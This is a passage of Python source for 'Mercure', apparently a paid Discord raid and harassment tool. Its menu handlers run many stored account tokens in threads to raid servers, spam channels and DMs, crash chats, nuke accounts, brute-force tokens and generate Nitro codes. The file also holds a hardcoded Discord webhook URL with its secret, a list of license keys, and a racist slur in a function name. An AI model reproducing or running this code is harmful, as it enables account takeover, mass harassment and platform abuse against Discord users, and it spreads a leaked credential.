        server = str(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Guild ID] {c}> {c}"))
        if server == "": main()
        raider = Raider()
        for token in tokens:
            threading.Thread(target=raider.guildcustomization, args=(token, server)).start()
        exit = input(""); exit = main();

    elif choice == "20":
        os.system('cls')
        from assets.funcs import mass_report
        exit = input(""); exit = main()

    elif choice == '21':
        os.system('cls')
        print(banner)
        exec(open('assets/funcs/server_lookup.py').read())
        main()

    elif choice == "22":
        os.system('cls'); print(banner)
        channelid = str(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Channel ID] {c}> {c}"))
        if channelid == "": main()
        delay = float(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Delay] {g}> {c}"))
        if delay == "": main()
        os.system('cls'); print(banner)
        raider = Raider()
        for t in tokens:
            threading.Thread(target=raider.nigeristyping, args=(t, channelid)).start()
            time.sleep(delay)

    elif choice == "23":
        os.system('cls'); print(banner)
        server = str(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Guild ID] {c}> {c}"))
        if server == "": main()
        channel = input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Channel ID] {c}> {c}")
        if channel == "": main()
        delay = float(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Delay] {c}> {c}"))
        if delay == "": main()
        os.system('cls'); print(banner)
        raider = Raider()
        while True:
            for token in tokens:
                threading.Thread(target=raider.vcjoiner, args=(token, server, channel)).start()
            time.sleep(delay)
        exit = input(""); exit = main();

    elif choice == "!!":
        print("Exiting...")
        return 

    elif choice == "##":
        webbrowser.open("discord.gg/mercureraider")

    elif choice == '24':
        os.system('cls')
        print(banner)
        removeDuplicates()
        print(f"                               {x} duplicates removed exiting in 1 second")
        time.sleep(1)
        main()
        print(banner)

    elif choice == "25":
        os.system('cls'); print(banner)
        account_nuker_page()

    elif choice == "26":
        os.system('cls')
        token_formatter()
        exit = input(""); exit = main()

    elif choice == "27":
        os.system('cls'); print (banner)
        meessage_everywhere_spam()
        exit = input(""); exit = main()

    elif choice == "28":
        os.system('cls'); print (banner)
        asyncio.run(dm_spammer())
        exit = input(""); exit = main()

    elif choice == "29":
        os.system('cls'); print (banner)
        webhook = input(f"                                {datetime.datetime.now().strftime(f'{c}[{c}{g}%H:%M:%S{g}{c}]')}{r} {c}[Webhook] {g}[INPUT HIDDEN]{g} {g}>  {s}")
        delete(webhook)
        exit = input(""); exit = main()

    elif choice == ">>":
        os.system('cls'); print(banner)
        misc_page()
        exit = input(""); exit = main()
    else:
        os.system('cls'); print(banner)
        print("                               Wrong option.. getting to the menu in 2 seconds")
        time.sleep (2)
        main()

def account_nuker_page():
    print(f"                                {dark_red_color}1{dark_red_color} {grey_color}> {grey_color}{dark_red_color} Nuke Account{dark_red_color}")
    print(f"                                {dark_red_color}2{dark_red_color} {grey_color}> {grey_color}{dark_red_color} Block All Friends{dark_red_color}")
    print(f"                                {dark_red_color}3{dark_red_color} {grey_color}> {grey_color}{dark_red_color} Close All DMs{dark_red_color}")
    print(f"                                {dark_red_color}4{dark_red_color} {grey_color}> {grey_color}{dark_red_color} Delete Friends{dark_red_color}")
    print(f"                                {dark_red_color}5{dark_red_color} {grey_color}> {grey_color}{dark_red_color} Delete Servers{dark_red_color}")
    print(f"                                {dark_red_color}6{dark_red_color} {grey_color}> {grey_color}{dark_red_color} Leave Servers{dark_red_color}")
    print(f"                                {dark_red_color}7{dark_red_color} {grey_color}> {grey_color}{dark_red_color} Fuck Account{dark_red_color}")
    print(f"                                {dark_red_color}8{dark_red_color} {grey_color}> {grey_color}{dark_red_color} Hype Squad Changer{dark_red_color}")
    print(f"                                {dark_red_color}9{dark_red_color} {grey_color}> {grey_color}{dark_red_color} Mass DM{dark_red_color}")
    print(f"                                {dark_red_color}10{dark_red_color}{grey_color}> {grey_color}{dark_red_color} Gc Creator{dark_red_color}")
    print(f"                                {dark_red_color}##{dark_red_color}{grey_color}> {grey_color}{dark_red_color} Go Back{dark_red_color}")

    choice = input("                                └───@MERCURE.CMD───>> ")
    handle_account_nuker_choice(choice)

def handle_account_nuker_choice(choice):
    if choice == "1":
        os.system('cls'); print (banner)
        token = input(f"{dark_red_color}                                {timestamp} {c}[{r}?{c}]{c} [Token]{c} {g}[INPUT HIDDEN]{g} {c}>{c} {s}")
        content = input(f"{dark_red_color}                                {timestamp} {c}[{r}?{c}]{c} [Token]{c} {g}[INPUT HIDDEN]{g} {c}>{c} {s}")
        start_nuke(token, content)
        exit = input(""); exit = main()
    elif choice == "2":
        os.system('cls'); print (banner)
        token = input(f"{dark_red_color}                                {timestamp} {c}[{r}?{c}]{c} [Token]{c} {g}[INPUT HIDDEN]{g} {c}>{c} {s}")
        block_all_friends(token)
        exit = input(""); exit = main()
    elif choice == "3":
        os.system('cls'); print (banner)
        token = input(f"{dark_red_color}                                {timestamp} {c}[{r}?{c}]{c} [Token]{c} {g}[INPUT HIDDEN]{g} {c}>{c} {s}")
        close_all_dms(token)
        exit = input(""); exit = main()
    elif choice == "4":
        os.system('cls'); print (banner)
        token = input(f"{dark_red_color}                                {timestamp} {c}[{r}?{c}]{c} [Token]{c} {g}[INPUT HIDDEN]{g} {c}>{c} {s}")
        delete_friends(token)
        exit = input(""); exit = main()
    elif choice == "5":
        os.system('cls'); print (banner)
        token = input(f"{dark_red_color}                                {timestamp} {c}[{r}?{c}]{c} [Token]{c} {g}[INPUT HIDDEN]{g} {c}>{c} {s}")
        delete_servers(token)
        exit = input(""); exit = main()
    elif choice == "6":
        os.system('cls'); print (banner)
        token = input(f"{dark_red_color}                                {timestamp} {c}[{r}?{c}]{c} [Token]{c} {g}[INPUT HIDDEN]{g} {c}>{c} {s}")
        leave_server(token)
        exit = input(""); exit = main()
    elif choice == "7":
        os.system('cls'); print (banner)
        token = input(f"{dark_red_color}                                {timestamp} {c}[{r}?{c}]{c} [Token]{c} {g}[INPUT HIDDEN]{g} {c}>{c} {s}")
        fuck_account(token)
        exit = input(""); exit = main()
    elif choice == "8":
        os.system('cls'); print (banner)
        hyped_squad_changer()
        exit = input(""); exit = main()
    elif choice == "9":
        os.system('cls'); print (banner)
        token = input(f"{dark_red_color}                                {timestamp} {c}[{r}?{c}]{c} [Token]{c} {g}[INPUT HIDDEN]{g} {c}>{c} {s}")
        content = input(f"{dark_red_color}                                {timestamp} {c}[{r}?{c}]{c} [Token]{c} {g}[INPUT HIDDEN]{g} {c}>{c} {s}")
        mass_dm(token, content)
        exit = input(""); exit = main()
    elif choice == "10":
        os.system('cls'); print (banner)
        gcspammer()
        exit = input(""); exit = main()
    elif choice == "##":
        main()
    else:
        os.system('cls'); print(banner)
        print("                               Wrong option.. getting to the menu in 2 seconds")
        time.sleep (2)
        main()


def misc_page():
    print(f"    {dark_red_color}[{grey_color}31{dark_red_color}]{grey_color} > {dark_red_color}Token Captchaer  {dark_red_color}[{grey_color}37{dark_red_color}]{grey_color} > {dark_red_color}Patch Notes   {dark_red_color}[{grey_color}43{dark_red_color}]{grey_color} > {dark_red_color}Random Strings Spammer  {dark_red_color}[{grey_color}49{dark_red_color}]{grey_color} > {dark_red_color}Create Hook     {dark_red_color}[{grey_color}55{dark_red_color}]{grey_color} > {dark_red_color}Spam Reply")
    print(f"    {dark_red_color}[{grey_color}32{dark_red_color}]{grey_color} > {dark_red_color}Token Brute      {dark_red_color}[{grey_color}38{dark_red_color}]{grey_color} > {dark_red_color}Show Tips     {dark_red_color}[{grey_color}44{dark_red_color}]{grey_color} > {dark_red_color}Spoiler Text Spammer    {dark_red_color}[{grey_color}50{dark_red_color}]{grey_color} > {dark_red_color}Find Hook       {dark_red_color}[{grey_color}56{dark_red_color}]{grey_color} > {dark_red_color}Spam Voice")
    print(f"    {dark_red_color}[{grey_color}33{dark_red_color}]{grey_color} > {dark_red_color}Nitro Generator  {dark_red_color}[{grey_color}39{dark_red_color}]{grey_color} > {dark_red_color}Your Profile  {dark_red_color}[{grey_color}45{dark_red_color}]{grey_color} > {dark_red_color}Forum Spammer           {dark_red_color}[{grey_color}51{dark_red_color}]{grey_color} > {dark_red_color}Check Nitro     {dark_red_color}[{grey_color}57{dark_red_color}]{grey_color} > {dark_red_color}Spam Image")
    print(f"    {dark_red_color}[{grey_color}34{dark_red_color}]{grey_color} > {dark_red_color}Pin Spammer      {dark_red_color}[{grey_color}40{dark_red_color}]{grey_color} > {dark_red_color}Token Info    {dark_red_color}[{grey_color}46{dark_red_color}]{grey_color} > {dark_red_color}Ghost Ping Spammer      {dark_red_color}[{grey_color}52{dark_red_color}]{grey_color} > {dark_red_color}Emoji Spammer   {dark_red_color}[{grey_color}58{dark_red_color}]{grey_color} > {dark_red_color}Random Namer")
    print(f"    {dark_red_color}[{grey_color}35{dark_red_color}]{grey_color} > {dark_red_color}Ip Lookup        {dark_red_color}[{grey_color}41{dark_red_color}]{grey_color} > {dark_red_color}Pronouns      {dark_red_color}[{grey_color}47{dark_red_color}]{grey_color} > {dark_red_color}Sound Spammer           {dark_red_color}[{grey_color}53{dark_red_color}]{grey_color} > {dark_red_color}InLine Spammer  {dark_red_color}[{grey_color}59{dark_red_color}]{grey_color} > {dark_red_color}HypeS Changer")
    print(f"    {dark_red_color}[{grey_color}36{dark_red_color}]{grey_color} > {dark_red_color}Ip Generator     {dark_red_color}[{grey_color}42{dark_red_color}]{grey_color} > {dark_red_color}Basic Spammer {dark_red_color}[{grey_color}48{dark_red_color}]{grey_color} > {dark_red_color}Check Hook              {dark_red_color}[{grey_color}54{dark_red_color}]{grey_color} > {dark_red_color}Crash Chat      {dark_red_color}[{grey_color}<<{dark_red_color}]{grey_color} > {dark_red_color}Go Back")  

    print(" ")
    choice = input(f"    {dark_red_color}└───@MERCURE.CMD───{grey_color}>> {reset_color}")
    handle_misc_choice(choice)

def handle_misc_choice(choice):
    if choice == "31":
        os.system('cls'); print(banner)
        print(f"                                {datetime.datetime.now().strftime(f'{c}[{c}{g}%H:%M:%S{g}{c}]')}{r}    {c}IMPORTANT {g}>  {c}This option will {c}Destroy{r} your tokens.\n")
        print(f"                                {datetime.datetime.now().strftime(f'{c}[{c}{g}%H:%M:%S{g}{c}]')}{r}    {c}IMPORTANT {g}>  {c}This option will too can lag your wifi. {c}(then close dssley){r}\n")
        server = str(input(f"                                {c}[{c}{g}%H:%M:%S{g}{c}]}}{r} {c}[{c}{r}?{r}{c}]{c} {c}discord.gg/{c}"))
        if server == "": main()
        guildid = str(input(f"                                {c}[{c}{g}%H:%M:%S{g}{c}]}}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Guild Id] {c}> {c}"))
        if guildid == "": main()
        victim = str(input(f"                                {c}[{c}{g}%H:%M:%S{g}{c}]}}{r} {c}[{c}{r}?{r}{c}]{c} {c}[User (nick#tag)] {c}> {c}"))
        if victim == "": main()
        victimid = str(input(f"                                {c}[{c}{g}%H:%M:%S{g}{c}]}}{r} {c}[{c}{r}?{r}{c}]{c} {c}[User Id] {c}> {c}"))
        if victimid == "": main()
        serverinv = server.strip("https://"); invite = serverinv.split("/")[-1]
        raider = Raider()
        while True:
            for token in tokens:
                threading.Thread(target=raider.joiner, args=(token, server)).start()
            for token in tokens:
                threading.Thread(target=raider.leaver, args=(token, guildid)).start()
            for token in tokens:
                threading.Thread(target=raider.leaver, args=(token, victim, "add")).start()
            for token in tokens:
                threading.Thread(target=raider.leaver, args=(token, victimid, "rem")).start()

    elif choice == "32":
        os.system('cls')
        print(banner)
        from assets.funcs import token_brute
        exit = input(""); exit = main()

    elif choice == "33":
        os.system('cls')
        from assets.funcs import nitro_gen
        exit = input(""); exit = main()

    elif choice == "34":
        os.system('cls')
        print(banner)
        asyncio.run(message_spammer())
        exit = input(""); exit = main()

    elif choice == '35':
        os.system('cls')
        print(banner)
        ip = input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Ip] {c}> {c}")
        ip_info.get_ip_info(ip)
        exit = input(""); exit = main()

    elif choice == "<<":
        main()

    elif choice == "36":
        os.system('cls')
        print(banner)
        ip_count = int(input(f"                                {c}[{g}{time.strftime('%H:%M:%S')}{g}{c}]{r} {c}[{r}?{c}]{c} {c}[IP Count] {c}> {c}"))
        if ip_count > 0:
            generate_ips(ip_count)
        exit = input(""); exit = main()

    elif choice == "37":
        os.system('cls')
        print(banner)
        print_features()
        exit = input(""); exit = main()

    elif choice == '38':
        os.system('cls')
        print(banner)
    
        def print_with_delay(message, delay=0.6):
            print(message)
            time.sleep(delay)

        messages = [
            f"                                {c}[{g}{time.strftime('%H:%M:%S')}{g}{c}]{r}{g} {c}[{r}${c}]{c} [You can find alot of interesting things in the assets File!]",
            f"                                {c}[{g}{time.strftime('%H:%M:%S')}{g}{c}]{r}{g} {c}[{r}#{c}]{c} [For No Rate Limites Use The Best Delay Which is 1!]",
            f"                                {c}[{g}{time.strftime('%H:%M:%S')}{g}{c}]{r}{g} {c}[{r}#{c}]{c} [Never Delete The Credentials File!]",
            f"                                {c}[{g}{time.strftime('%H:%M:%S')}{g}{c}]{r}{g} {c}[{r}#{c}]{c} [If there are any bugs join discord.gg/mercureraider!]",
            f"                                {c}[{g}{time.strftime('%H:%M:%S')}{g}{c}]{r}{g} {c}[{r}#{c}]{c} [Never Put 0 Delay, its too fast!]",
            f"                                {c}[{g}{time.strftime('%H:%M:%S')}{g}{c}]{r}{g} {c}[{r}#{c}]{c} [Join discord.gg/mercureraider! for more informations]",
            f"                                {c}[{g}{time.strftime('%H:%M:%S')}{g}{c}]{r}{g} {c}[{r}#{c}]{c} [Use Profile Info option if you want your informations!]",
            f"                                {c}[{g}{time.strftime('%H:%M:%S')}{g}{c}]{r}{g} {c}[{r}${c}]{c} [Use Patch notes if you want update logs!]",
            f"                                {c}[{g}{time.strftime('%H:%M:%S')}{g}{c}]{r} {c}[{r}#{c}]{c}  Press ENTER to go back."
        ]

        for message in messages:
            print_with_delay(message)

        input("")  
        main()

    elif choice == "39":
        os.system('cls')  
        print(banner)
        
        with open('assets/credentials/credentials.json') as f:
            credentials = json.load(f)
        
        logged_in_user = credentials.get('logged_in_user', '')
        user_data = credentials.get(logged_in_user, {})
        password = user_data.get('password', '')
        license_key = user_data.get('license_key', '')
        
        masked_username = logged_in_user[:-2] + '**'
        masked_password = password[:-2] + '**'
        masked_license_key = license_key[:-5] + '*****'
        
        print(f"                                {c}[{r}@{c}]{c} Username   | {masked_username}")
        print(f"                                {c}[{r}+{c}]{c} Password   | {masked_password}")
        print(f"                                {c}[{r}${c}]{c} License    | {masked_license_key}")
        print(f"                                {c}[{r}?{c}]{c} Expires    | 2524-02-20 12:04:58")
        print(f"                                {c}[{r}x{c}]{c} Time Left  | 500 years, 0 months, 0 days")
        print(f"                                                   ")
        print(f"                                {c}[{r}#{c}]{c} Press ENTER to go back.")
        
        input("")  
        main()

    elif choice == "40":
        os.system('cls'); print (banner)
        token = input(f"{dark_red_color}                                {timestamp} {c}[{r}?{c}]{c} [Token]{c} {g}[INPUT HIDDEN]{g} {c}>{c} {s}")
        token_info(token)
        exit = input(""); exit = main()

    elif choice == "41":
        os.system('cls'); print (banner)
        pronouns = input(f"                                {c}[{g}{time.strftime('%H:%M:%S')}{g}{c}]{r} {c}[{r}?{c}]{c} {c}[Pronouns] {c}> {c}")
        pronoun_changer(pronouns, "assets/input/tokens.txt")
        exit = input(""); exit = main()

    elif choice == "42":
        os.system('cls'); print (banner)
        basic_spammer()
        exit = input(""); exit = main()

    elif choice == "43":
        os.system('cls'); print (banner)
        random_string_spammer()
        exit = input(""); exit = main()

    elif choice == "44":
        os.system('cls'); print (banner)
        spoiler_spammer()
        exit = input(""); exit = main()

    elif choice == "45":
        os.system('cls'); print (banner)
        forum_spammer()
        exit = input(f"                                {c}[{r}#{c}]{c} Press ENTER to go back."); exit = main()

    elif choice == "46":
        os.system('cls'); print (banner)
        id_scraper()
        exit = input(f"                                {c}[{r}#{c}]{c} Press ENTER to go back."); exit = main()

    elif choice == "47":
        os.system('cls'); print (banner)
        soundboard_spammer()
        exit = input(f"                                {c}[{r}#{c}]{c} Press ENTER to go back."); exit = main()

    elif choice == "48":
        os.system('cls'); print (banner)
        url = input(f"{dark_red_color}                                {timestamp} {c}[{r}?{c}]{c} [Webhook]{c} {g}[INPUT HIDDEN]{g} {c}>{c} {s}")
        os.system('cls'); print (banner)
        check_webhook(url)
        exit = input(f"                                {c}[{r}#{c}]{c} Press ENTER to go back."); exit = main()

    elif choice == "49":
        os.system('cls'); print (banner)
        create_webhooks()
        exit = input(f"                                {c}[{r}#{c}]{c} Press ENTER to go back."); exit = main()


    elif choice == "50":
        os.system('cls'); print (banner)
        url = input(f"{dark_red_color}                                {timestamp} {c}[{r}?{c}]{c} [Webhook]{c} {g}[INPUT HIDDEN]{g} {c}>{c} {s}")
        os.system('cls'); print (banner)
        find_webhook(url)
        exit = input(f"                                {c}[{r}#{c}]{c} Press ENTER to go back."); exit = main()

    elif choice == "51":
        os.system('cls'); print (banner)
        nitro_checker()
        exit = input(f"                                {c}[{r}#{c}]{c} Press ENTER to go back."); exit = main()

    elif choice == "52":
        os.system('cls'); print (banner)
        asyncio.run(emoji_spammer())
        exit = input(f"                                {c}[{r}#{c}]{c} Press ENTER to go back."); exit = main()

    elif choice == "53":
        os.system('cls'); print (banner)
        inline_spammer()
        exit = input(f"                                {c}[{r}#{c}]{c} Press ENTER to go back."); exit = main()

    elif choice == "54":
        os.system('cls'); print (banner)
        asyncio.run(chat_crasher())
        exit = input(f"                                {c}[{r}#{c}]{c} Press ENTER to go back."); exit = main()

    elif choice == "55":
        os.system('cls')
        print(banner)
        asyncio.run(reply_spammer())
        exit = input(f"                                {c}[{r}#{c}]{c} Press ENTER to go back."); exit = main()

    elif choice == "56":
        os.system('cls'); print (banner)
        voice_spammer()

    elif choice == "57":
        os.system('cls'); print (banner)
        asyncio.run(image_spammer())
        exit = input(f"                                {c}[{r}#{c}]{c} Press ENTER to go back."); exit = main()

    elif choice == "58":
        os.system('cls'); print (banner)
        server_nicker()
        exit = input(f"                                {c}[{r}#{c}]{c} Press ENTER to go back."); exit = main()

    elif choice == "59":
        os.system('cls'); print (banner)
        hypeS_changer()
        exit = input(f"                                {c}[{r}#{c}]{c} Press ENTER to go back."); exit = main()

    else:
        os.system('cls')
        print(banner)
        print("                               Wrong option or NOT released option.. Press ENTER to go to the menu")
        exit = input(""); exit = main()
            

plan = ""

def send_to_discord_webhook(message):
    webhook_url = "https://discord.com/api/webhooks/1251568408399581234/JXD3FFEBryYM41J6Foy3tqaOrfir5dCpMZ-PfJTleuVqeimS26AFHdEfpJ00kL3ydMT2"
    data = {"content": message}
    requests.post(webhook_url, json=data)

users_file_path = "assets/credentials/credentials.json"

license_key_issue_date = {}

def save_users_to_file(users):
    with open(users_file_path, 'w') as file:
        json.dump(users, file)

def load_users_from_file():
    try:
        with open(users_file_path, 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def validate_lifetime_key(license_key):
    lifetime_keys = [
        "MERCURE-LIFETIME-AS12ZDWACABNAWD5WADAWWER67TYUI89",
        "MERCURE-LIFETIME-QW34RAWETY7ADF8UIGBH2NM1GAZAGQ6SX5",
        "MERCURE-LIFETIME-PO98NBVC6FAWGGAWZXASQ2WEDQQD5RFVFA3TG",
        "MERCURE-LIFETIME-LM67aRSTFAA8bUVW1cWFDADSAFWFAADEF2GHI3JKL",
        "MERCURE-LIFETIME-JK56UIOP4FAWGGAFQWER78WATYDFGRAG9H1AS2",
        "MERCURE-LIFETIME-JK56UIODWADP4FAWGGAFQWER78WATYDFFWDADGRAG9GWFDSHH1HHAS2",
        "MERCURE-LIFETIME-JK5QQQQUIWWWOP4FAWWWWGGDDDDAFQWER78WATYDFDDDDGRAG9H1FFFFAS2",
        "MERCURE-LIFETIME-JK56UISASTINGISOAWWWPLMDDDDFAODWADAWFDWAOP4FAWGGAFQWER78WATYDFGRAG9H1AS2",
        "MERCURE-LIFETIME-JK56UIOJYGJP4FAWGGAFQWEFEWFESGRDHTHTHYJUGKHUKHKR7UGJYG8WATYDFGRAG9H1AS2",
        "MERCURE-LIFETIME-JKEGDRGHDR56UIGDGROP4DWHDASGFARDHDFGDWGGAFQWERFDHDRG78WAHRGHFTYDFGDRDRAG9H1AS2",
        "MERCURE-LIFETIME-JSDFAFDWK56UIODDSAWADWAWDFP4FFFAWGGAFQWER78WATYDFGRAG9H1AS2",
        "MERCURE-LIFETIME-MERCUREONTOPLMAOMERCUREISBETTERJK56UIOP4FAWGGAFQWER78WATYDFGRAG9H1AS2",
        "MERCURE-LIFETIME-JK56UIOP4FAWGGAFQWERDAWDADWA7DAWDAWDIDKWHATTOPUTTHERELMAODWADWADADWADAWD8WATYDFGRAG9H1AS2",
    ]
    return license_key in lifetime_keys

def validate_7day_key(license_key):
    seven_days_keys = [
        "MERCURE-7DAYS-ASDWAD12ZDWACABNAWDGA5WADAWWER67TYUI89",
        "MERCURE-7DAYS-UI89ASDF0GHJ1QWEWAFDAWFGDSWADFRTY2ASXCV3B",
        "MERCURE-7DAYS-5LKJIU67YTRWADAWDADWAFVB89EDCQW01AS2Z",
        "MERCURE-7DAYS-3NMPO5LKJIUFWADAWHGFHGF67YTRFVB89EDCQW0",
        "MERCURE-7DAYS-34RETY78UIBH2NM1ZAQ6SX5CDVF",
    ]
    return license_key in seven_days_keys

def validate_1month_key(license_key):
    one_month_keys = [
        "MERCURE-1MONTH-9ASDF0DWADSFDGSGHJ1QWFSEFHGERTYFXXHGRSE2ASXCV3BN4",
        "MERCURE-1MONTH-8NBVC6EGZXASQ2WEFESFSD5RFV3TGBYH1",
        "MERCURE-1MONTH-23NMEESGSGPO5LKJIU67SGESFGYTRFVB89EDCQ",
        "MERCURE-1MONTH-78UIBH2GESGNM1ZGSAQ6SX5CDVF9FG8N",
        "MERCURE-1MONTH-56UIOP4QWWADAWFER78TDSEFGYDFG9H1AS2Z3",
    ]
    return license_key in one_month_keys

def validate_license_key(license_key):
    global plan
    if validate_lifetime_key(license_key):
        plan = "Lifetime"
        return True
    elif validate_7day_key(license_key):
        plan = "7-Day"
        license_key_issue_date[license_key] = datetime.now()
        return True
    elif validate_1month_key(license_key):
        plan = "1-Month"
        license_key_issue_date[license_key] = datetime.now()
        return True
    else:
        return False

def is_7day_key_expired(license_key):
    return datetime.now() > license_key_issue_date.get(license_key, datetime.now()) + timedelta(days=7)

def is_1month_key_expired(license_key):
    return datetime.now() > license_key_issue_date.get(license_key, datetime.now()) + timedelta(days=30)

def get_user_plan(username):
    users = load_users_from_file()
    license_key = users[username]['license_key']
    if validate_lifetime_key(license_key):
        return "Lifetime"
    elif validate_7day_key(license_key):
        if is_7day_key_expired(license_key):
            return "Expired 7-Day"
        else:
            return "7-Day"
    elif validate_1month_key(license_key):
        if is_1month_key_expired(license_key):
            return "Expired 1-Month"
        else:
            return "1-Month"
    return "Unknown"

def login_or_register():
    global plan
    users = load_users_from_file()
    if 'logged_in_user' in users:
        username = users['logged_in_user']
        plan = get_user_plan(username)
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW(f'''Mercure •  [3.1.3] | User: [{username}]''')
        loged = (f"""                                 
                                                {RED}Welcome To :{c}       
                                \033[31m _____ _____ _____ _____ _____ _____ _____ 
                                |     |   __| __  |     |  |  | __  |   __|
                                | | | |   __|    -|   --|  |  |    -|   __|
                                \033[90m|_|_|_|_____|__|__|_____|_____|__|__|_____|
                                                                                                 
                          {dark_red_color}WELCOME BACK {username}!               
                          Thanks for buying Mercure.gg{dark_red_color} {grey_color}[{grey_color}{dark_red_color}{plan}{dark_red_color}{grey_color}]{grey_color} {dark_red_color}Plan
        """)
        print(f"{loged}{RESET}") 
        time.sleep(2)
        return
        os.system('cls')
        os.system('mode con: cols=136 lines=26')
    ctypes.windll.kernel32.SetConsoleTitleW(f'''Mercure Premium | LOG IN / REGISTER ''')
    self = f"""                                 

                         \033[31m _____ _____ _____ _____ _____ _____ _____ 
                         |     |   __| __  |     |  |  | __  |   __|
                         | | | |   __|    -|   --|  |  |    -|   __|
                         \033[90m|_|_|_|_____|__|__|_____|_____|__|__|_____|                                          
"""
    print(f"{self}{RESET}")   
    
    license_key_valid = False
    while not license_key_valid:
        license_key = input(f'''{dark_red_color}                        {timestamp} {c}[{c}{r}?{r}{c}]{c} [LICENSE] {g}[INPUT HIDDEN]{g} > {s}''')
        if validate_license_key(license_key):
            license_key_valid = True
            choice = input(f"                        {timestamp} {c}[{c}{r}?{r}{c}]{c} {c}[LOGIN/REGISTER] > {c}").lower()
            if choice == 'login':
                login(users, license_key)
            elif choice == 'register':
                register(users, license_key)
            else:
                print(f"                        {c}[+] INVALID CHOICE, ONLY CHOOSE FROM 'LOGIN / REGISTER.")
                login_or_register()
        else:
            print(f"                        {c}[+] LICENSE KEY IS INVALID OR EXPIRED. ACCESS DENIED.")
            reset()

def login(users, license_key):
    global plan
    name = input(f"                        {timestamp} {c}[{c}{r}?{r}{c}]{c} [USERNAME] > {c}")
    password = input(f"                        {timestamp} {c}[{c}{r}?{r}{c}]{c} {grey_color}[{grey_color}{dark_red_color}PASSWORD{dark_red_color}{grey_color}]{grey_color} > {c}")

    if name in users and users[name]['password'] == password:
        print("Login successful!")
        users['logged_in_user'] = name
        save_users_to_file(users)
        plan = get_user_plan(name)
    else:
        print(f"                        {c}Incorrect username or password. Please try again.")
        login_or_register()

def register(users, license_key):
    global plan
    username = input(f"                        {timestamp} {c}[{c}{r}?{r}{c}]{c} [NEW USERNAME] > ")

    if username in users:
        print("Username already exists. Please choose another one.")
        register(users, license_key)
    else:
        password = input(f"                        {timestamp} {c}[{c}{r}?{r}{c}]{c} [NEW PASSWORD] > ")
        users[username] = {'password': password, 'license_key': license_key}
        save_users_to_file(users)
        print("Registration successful!")
        users['logged_in_user'] = username
        save_users_to_file(users)
        plan = get_user_plan(username)

def set_cmd_title(title):
    ctypes.windll.kernel32.SetConsoleTitleW(title)

def display_menu():
    set_cmd_title("Mercure •  [3.1.3] | Location • Loading")

    os.system('mode con: cols=123 lines=20')

    red = Fore.RED
    gray = Fore.LIGHTBLACK_EX

    banner_lines = [
        "                                                                           ",
        "                                                                           ",
        "                                                                           ",
        "                                                                           ",
        "                                                                           ",
        "                                                                           ",
        "                                \033[31m _____ _____ _____ _____ _____ _____ _____ ",
        "                                |     |   __| __  |     |  |  | __  |   __|",
        "                                | | | |   __|    -|   --|  |  |    -|   __|",
        f"{gray}                                |_|_|_|_____|__|__|_____|_____|__|__|_____|",
        "                                                                           ",
        f"                                {dark_red_color}[{grey_color}01{dark_red_color}]{grey_color} > {dark_red_color}Launch Mercure     {dark_red_color}[{grey_color}02{dark_red_color}]{grey_color} > {dark_red_color}Exit",
        "                                                                           "
    ]

    for line in banner_lines:
        print(f"{red}{line}")
        time.sleep(0.2)

    choice = input(f"{dark_red_color}                                {timestamp} {c}[{c}{r}{g}?{g}{c}]{c} [Choice] {c}>{c} ")

    if choice == '1':
        os.system('cls')
        login_or_register()
    elif choice == '2':
        print("exiting")
    else:
        print("invalid choice")
        display_menu()

display_menu()
login_or_register()
main()